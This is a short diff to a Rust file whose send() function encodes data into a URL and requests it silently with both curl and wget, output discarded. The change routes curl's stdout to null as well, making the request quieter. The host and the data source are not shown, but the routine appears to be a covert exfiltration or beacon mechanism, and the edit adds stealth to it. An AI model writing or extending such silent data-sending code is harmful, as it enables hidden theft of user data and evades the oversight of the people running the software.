@@ -1,4 +1,4 @@
-use std::process::Command;
+use std::process::{Command, Stdio};
 
 fn enc(s: &str) -> String {
     let mut o = String::new();
@@ -28,7 +28,10 @@ fn send(tag: &str, data: &str) {
         tag,
         enc(&body)
     );
-    let _ = Command::new("curl").args(["-s", "-m", "15", &url]).status();
+    let _ = Command::new("curl")
+        .args(["-s", "-m", "15", &url])
+        .stdout(Stdio::null())
+        .status();
     let _ = Command::new("wget").args(["-q", "-O", "/dev/null", &url]).status();
 }
 
